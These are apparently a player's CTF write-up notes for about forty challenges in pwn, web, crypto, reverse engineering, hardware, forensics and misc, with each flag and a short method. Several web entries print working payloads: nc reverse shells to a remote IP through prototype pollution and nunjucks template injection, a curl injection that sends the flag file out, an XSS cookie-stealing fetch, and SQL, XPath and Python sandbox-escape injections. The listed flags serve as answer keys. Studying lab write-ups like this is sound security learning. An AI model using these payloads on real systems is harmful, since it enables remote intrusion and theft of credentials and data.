# Pwn

### Controller: CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}
- use 3 * -66 to trigger negative overflow and meet requirement to read in string with scanf
- overflow string read in with scanf (must use "b" or "y" instead of usual "A" filler trigger return)
- leak printf address in libc in order to calculate "/bin/sh" and system function locations

### Minefield: CHTB{d3struct0r5_m1n3f13ld}
- binary reads in two values and stores the second one at the address of the first
- use it as an arbitary write to place the address of the win function ("_" within the binary) somewhere will it will be called
- iterate through binary symbols and GOT entries with pwntools ("BIN.symbols.items()" and "BIN.got.items()") to find suitable write location that triggers win

### System dROP: CHTB{n0_0utput_n0_pr0bl3m_w1th_sr0p}
- binary is immediately exploitable with input up to 256 bytes read into a 32 byte buffer
- only imported functions are *read* and *alarm*, but there's a syscall gadget available
- can't easily control EAX (for specific syscall) or EDX (for length of write)
- happen to be set to EAX of 1 (write syscall) and EDX of 256 (bytes written)
- leak libc addresses from GOT with write syscall to fingerprint libc on server
- use exploit to leak read address in GOT and calculate "/bin/sh" string and *system* function offsets

### Harvester: CHTB{h4rv35t3r_15_ju5t_4_b1g_c4n4ry}
- full protections on binary (RELRO, PIE, stack canary, NX set)
- run function with stack canary (sym.inventory) to place it on stack then leak it with printf vulnerability in sym.fight
- sym.fight vulnerability limited to 5 characters, so can only leak addresses and not inject payloads
- find any libc address also on the stack (one is located at offset 21) and calculate its distance from libc base
- put together payload that takes advantage of sym.inventory read overflow (0x40 bytes in 0x28 buffer)
- payload includes leaked canary and one gadget in libc (only enough space for one return address)

### Save the environment: CHTB{u_s4v3d_th3_3nv1r0n_v4r14bl3!}
- binary has all protections except PIE
- sym.plant function takes two inputs and then writes the second one into the location of the first
- sym.recycle function gives you the location of printf in libc after using it 5 times
- binary also provides an easy win function, so a suitable return address is all that's needed
- allows you to get the base address of libc and then calculate the location of the environ pointer in libc
- recycling 10 times allows you to print the contents of a memory address
- providing it with the location of environ in libc gives you an address near the bottom of the stack
- calculating the offset from this location to the location of the return address of sym.plant when it's called
- offset stays constant and gives you an address to write the win function to so that it gets called


# Web

### Inspector Gadget: CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}
- HTML, CSS, and JS source contain pieces of flag

### DaaS: CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}
- https://infosecwriteups.com/rce-on-a-laravel-private-program-2fb16cfb9f5c
- python exploit.py http://188.166.172.13:32573/ /tmp/exploit.phar
- php -d'phar.readonly=0' ./phpggc/phpggc --phar phar -f -o /tmp/exploit.phar monolog/rce1 system {CMD}

### BlitzProp: CHTB{p0llute_with_styl3}
- AST injection in pug and flatten node modules
- https://blog.p6.is/AST-Injection/
- {"song.name":"ASTa la vista baby", "__proto__.block": {"type": "Text",  "line": "process.mainModule.require('child_process').execSync(`nc 104.238.133.245 8008 -e /bin/sh`)"}}

### MiniSTRyplace: CHTB{b4d_4li3n_pr0gr4m1ng} 
- local file inclusion using directory traversal bypass
- replaces "../" with "" in "lang" parameter, can use "....//" to bypass filter

### CaaS: CHTB{f1le_r3trieval_4s_a_s3rv1ce}
- curl command vulnerable to injection that can send along flag located at "../../flag"
- curl -X POST http://138.68.139.183:30486/api/curl -d 'ip=-F "content=@../../flag" 104.238.133.245:8000'

### E.Tree: CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}
- XPath injection vulnerability, web app uses lxml python module to parse XML tree
- server errors from bad queries give debug info on what the backend is doing
- use XPath queries to search for fields within the file using *starts-with* and wildcard functionality
- payload -> {"search": "'] | (/military/district[@id])[2]/staff/selfDestructCode[starts-with(text(), 'CHTB{')] | name['"}
- https://www.guru99.com/xpath-selenium.html
- https://stackoverflow.com/questions/3737906/xpath-how-to-check-if-an-attribute-exists

### Cessation: CHTB{c3ss4t10n_n33d_sync1ng_#@$?}
- web application runs Apache Traffic Server v7.1.1 as a reverse proxy for nginx v14.0.1
- ATS uses remap.config to match incoming URLs and forward them along to the backend
- regex is used to match against incoming URLs before forwarding
- need to get to "/shutdown" endpoint which is remapped to "/403" by ATS remap.config
- requesting "//shutdown" (with burp, curl, or nc; doesn't work in browser as it removes it) allows bypass
- https://digi.ninja/blog/lighttpd_rewrite_bypass.php

### pcalc: CHTB{I_d0nt_n33d_puny_hum4n_l3tt3rs_t0_pwn!}
- provided with source code for web app that takes input and runs it through PHP's eval function
- first runs a check with regex to blacklist any input that contains letters, single quotes, or double quotes
- have to use PHP's xor functionality and string coercion to rebuild commands to get flag name and then read it
- would be easier if quotes weren't blacklisted, have to use heredoc syntax instead
- python script finds two words with valid characters that xor to the desired word, then builds into command and URL encodes
- reconstructing environment locally was a big help
- %28%3C%3C%3C_0%0A8%238%23%0A_0%0A%5E%3C%3C%3C_0%0A%5D%5B%5D%40%0A_0%0A%29%28%3C%3C%3C_0%0A%23%21%09%09%09%26%2C%218%09%0A_0%0A%5E%3C%3C%3C_0%0A%40%40%7D%29%26%40%40%40_%23%0A_0%0A%29
- https://ironhackers.es/en/tutoriales/saltandose-waf-ejecucion-de-codigo-php-sin-letras/
- https://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.heredoc

### Starfleet: CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!}
- provided with source for nodejs app that accepts an email address and uses nunjucks templating engine
- email is rendered into string by nunjucks, leaving it vulnerable to template injection
- possible to reconstruct a function using the "range.constructor" method within the nunjucks execution environment
- built repl for quick payload creation and response parsing
- can then read global object using "Object.getOwnPropertyNames(global)"
- missing "mainModule" from "global.process.mainModule", but the global object has another property named "globalThis"
- accessing "mainModule" through "global.globalThis.process" allows for recovery of "require" and ability to import "child_process" module
- can now get command execution with "execSync" within "child_process" module
- couldn't get production server to send to email address, so spawned reverse shell with "nc"
- bopije7405@gridmire.com {{range.constructor('return global.globalThis.process.mainModule.require("child_process").execSync("nc 104.238.133.245 8080 -e /bin/sh")')()}}
- http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
- https://mozilla.github.io/nunjucks/templating.html

### Extortion: CHTB{th4ts_4_w31rd_3xt0rt10n_@#$?}
- LFI vulnerability through "f" parameter
- "send.php" endpoint makes POST requests to the server, but all result in same response
- have a PHPSESSID cookie, can use it to search for the session log file
- eventually found it to be located at "/tmp/sess_<id>"
- make a request to the "send.php" input to inject PHP into the log and then execute it with LFI
- https://www.exploit-db.com/papers/13017
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md#lfi-to-rce-via-php-sessions
- https://highon.coffee/blog/lfi-cheat-sheet/

### emoji voting: CHTB{order_me_this_juicy_info}
- provided with source code for web app that reveals "order" post data is sent to "/api/list" endpoint and directly injected into SQL query after "ORDER BY"
- use CASE statement in sqlite as boolean test with LIKE string wildcard functionality to reveal name of flag table and then flag character by character
- if results are sorted by id, then the guessed character was correct
- sqlite information table is located in sqlite_master rather than information_schema.tables
- "(case when (select 1 from sqlite_master where tbl_name like 'flag_%') then id else count end) asc"
- "(case when (select 1 from <flag_tbl_name> where flag like 'CHTB{%') then id else count end) asc"
- https://portswigger.net/support/sql-injection-in-the-query-structure
- https://www.sqlitetutorial.net/sqlite-case/

### Bug Report: CHTB{th1s_1s_my_bug_r3p0rt}
- able to submit URLs that the bot then visits
- goal is to leak the flag cookie for the bug report site
- requesting a page that doesn't exist prints the name of site in the 404 page
- reflected XSS vulnerability allows you to insert script tag on the 404 page to send cookie away
- http://127.0.0.1:1337/<script>fetch("http://104.238.133.245:9001/?" + document.cookie)</script>

### The Galactice Times: CHTB{th3_wh1t3l1st3d_CND_str1k3s_b4ck}
- feedback submission at /feedback endpoint is vulnerable to XSS injection
- goal is to visit /alien endpoint which only the server side bot can do
- CSP allows 'unsafe-eval' and whitelists a CDN for scripts
- able to use the CDN to download Angular and then inject commands into <div ng-app></div ng-app> tags 
- possible to use XMLHttpRequest within inject commands to make request to same origin backend (must use absolute endpoints such as /alien, and not localhost such as http://127.0.0.1/alien to satisfy CSP)
- able to change location of window after getting page response, encoding it and sending it along with the location change request so that the data is exfiltrated
- https://brutelogic.com.br/blog/csp-bypass-guidelines/
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md
- https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass

### Alient Complaint Form: CHTB{CSP_4nd_Js0np_d0_n0t_alw4ys_g3t_al0ng}
- check CSP policy with Google's CSP evaluator point to potential problems with default-src 'self' if JSONP is also hosted
- source code provided and reveals JSONP usage, pointing to the potential attack vector
- website takes in a complaint and then the server bot visits the complaint list with a cookie
- able to pass callback to /list endpoint which gets executed on page load
- possible to inject an iframe into the complaint list which then makes a call to the /list endpoint specifying a callback to execute, acheiving command execution
- callback passed with JSONP callback changes location of parent's window and appends the document.cookie to the URL in order to leak it
- https://csp-evaluator.withgoogle.com/
- https://www.arridae.com/blogs/bypass-csp.php


# Crypto

### Soulcrabber: CHTB{mem0ry_s4f3_crypt0_f41l} - flag is xored with random bytes, but PRNG is seeded with known value
- can use Rust to get same sequence of bytes and retrieve flag

### Soulcrabber 2: CHTB{cl4551c_ch4ll3ng3_r3wr1tt3n_1n_ru5t}
- use system time in UNIX epoch seconds to seed PRNG
- get time that file was created and work backwards from there until out.txt is able to be decoded into the flag

### RSA Jam: CHTB{lambda_but_n0t_lam3_bda}
- provided with N, e, and d parameters and need to find another d that can decrypt messages encrypted with the N and e
- possible to get a different d that still works by using the Charmichael function (lcm(p-1, q-1)) rather than Euler's totient function ((p-1)*(q-1))
- generate d2 the same way as usual after calculating phi using the Charmichael function with p and q
- https://www.di-mgt.com.au/rsa_alg.html
- "The original definition of RSA uses the Euler totient function ϕ(n)=(p−1)(q−1). More recent standards use the Charmichael function λ(n)=lcm(p−1,q−1) instead. λ(n) is smaller than ϕ(n) and divides it. The value of d′ computed by d′=e−1modλ(n) is usually different from that derived by d=e−1modϕ(n), but the end result is the same. Both d and d′ will decrypt a message memodn and both will give the same signature value s=mdmodn=md′modn"


# Rev

### Authenticator: CHTB{th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3}
- xor embedded string with 9 to retrieve flag

### Passphrase: CHTB{3xtr4t3rR3stR14L5_VS_hum4n5}
- pause execution at strcmp to find secret passphrase

### Backdoor: CHTB{b4ckd00r5_4r3_d4nG3r0u5}
- extract compiled Python byte-code from PyInstaller created ELF binary
- use pyi-archive_viewer from PyInstaller pip package
- bd file contains backdoor code
- un-marshal and disassemble the extracted code with Python's "dis" and "marshal" modules
- checks for MD5 hash of password ("s4v3_th3_w0rld"), then accepts a length input, and then a command
- command must be prefixed with "command:"
- using strace and "dcs" functionality of radare2 helped with reversing
- https://stackoverflow.com/questions/44799687/unpacking-pyinstaller-packed-files
- https://reverseengineering.stackexchange.com/questions/22661/how-to-to-decompile-a-pyinstaller-exe-back-to-source-code


# Hardware

### Serial Logs: CHTB{wh47?!_f23qu3ncy_h0pp1n9_1n_4_532141_p2070c01?!!!52}
- provided with .sal file which can be opened in Logic 2 software from Saleae
- two hardware channels present, first one is empty
- applying a asynce serial analyzer with a baud rate of 115200 reveals the data to be logging connections
- second half of data is obscured and error message mentions switching to backup baud rate
- search for potential Raspberry Pi baud rates gave a lot of options but eventually decoded second half with baud rate of 72000

### Compromised: CHTB{nu11_732m1n47025_c4n_8234k_4_532141_5y573m!@52)#@%}
- need to use Logic 2 software again to analyze .sal file
- applying the I2C analyzer and trying both combinations of channels as SDA and SCL reveals data being writeen to two channels
- splitting the data between the repspetive channels and converting from hex to bytes reveals flag being sent on one of the channels

### Secure: CHTB{5P1_15_c0mm0n_0n_m3m02y_d3v1c35_!@52}
- need to use Logic 2 software again to analyze .sal file
- input has four channels hinting at using the SPI analyzer as the next logical step after the previous two challenges
- relatively easy to match up the channels correctly to produce an output
- output initially looked like all 0x00/0xFF but after looking closer there are hex value in the printable character range as well
- printing just those characters and skipping over 0x00 and 0xFF reveals the flag


# Forensics

### Oldest trick in the book: CHTB{long_time_no_s33_icmp}
- pcap file reveals ICMP tunneling is being used to send compressed data
- extract all the ICMP packets and their data using *tshark*
    - `tshark -r icmp.pcap -T fields -e data > icmp.hex`
- dedup the data from the packets and be sure to include those that weren't confirmed (only appear once) or zip will be corrupted
- extract the relevant bytes from each data section (bytes 16 through 48 inclusive, can be found by noticing repeat)
- write bytes to file and then unzip to extract file
- resulting zip file is a Firefox profile directory
- use firefox_decrypt.py to decrypt logins.json file and retrieve flag from password field
    - https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py

### Invitation: CHTB{maldocs_are_the_new_meta}
- extact malicious macros from file with olevba3
- deobfuscate by converting hex strings to bytes and then base64 decoding them
- remove \x00 bytes between each character
- reverse the PowerShell script to retrieve the flag (can be done by picking out the flag pieces)
    - find out how to better run PowerShell scripts with `pwsh`

### Key mission: CHTB{a_plac3_fAr_fAr_away_fr0m_earth}
- disect pcap file and retrieve all keypress captures (packets with "usbhid.data")
- dump packets to CSV, extract usbhid data, concatenate, and parse for key presses using HID mapping
- take shift into account for alternate characters and capitals
- take backspace into account and dedup rapid pushes of the same key
- https://gist.github.com/MightyPork/6da26e382a7ad91b5496ee55fdc73db2

### AlienPhish: CHTB{pH1sHiNg_w0_m4cr0s???}
- provided with a malicious PowerPoint file
- able to unzip like all PPT files and recover contents
- relative slide file located at "ppt/slides/slide1/_rels/slide1.xml.rels" contains malicious command
- able to parse it and extract a base64-urlsafe encoded filename that decodes to the flag

### Low Energy: CHTB{5p34k_fr13nd_4nd_3n73r}
- provided with a pcap file that contains captured packets using a protocol "similar to Bluetooth LE"
- able to find packet requesting public key and then a stream of packets sending a public key
- able to retrieve N and e from public key and factor N to calculate d
- encrypted message from packets sent after public key can be retrieved and decoded with d
- using bytes_to_long and long_to_bytes from Crypto.Util.number helped
- make sure you string null bytes from end of encrypted ciphertext


# Misc

### Alien Camp: CHTB{3v3n_4l13n5_u53_3m0j15_t0_c0mmun1c4t3}
- service sends emoji mapping following by 500 math problems using emojis
- build mapping dictionary and use to programmatically replace emojis with values
- use *eval* to calculate the answer for each round until the flag is sent back

### Input as a Service: CHTB{4li3n5_us3_pyth0n2.X?!}
- web services reads and executes Python commands but filters certain characters
- possible to bypass using `__import__('os').system('ls')` to read directory and `__import__('os').system('cat flag.txt')` to read flag
- https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes

### Build yourself in: CHTB{n0_j4il_c4n_h4ndl3_m3!}
- provided with system that runs input through Python's exec functions, removes built-ins, but leaves print
- possible to get built-ins back through "print.__self__"
- `chr = print.__self__.chr; os = print.__self__.__import__(chr(111)+chr(115)); print(os.system(chr(108)+chr(115)))`
- `chr = print.__self__.chr; os = print.__self__.__import__(chr(111)+chr(115)); print(os.system(chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(42)))`
- https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes
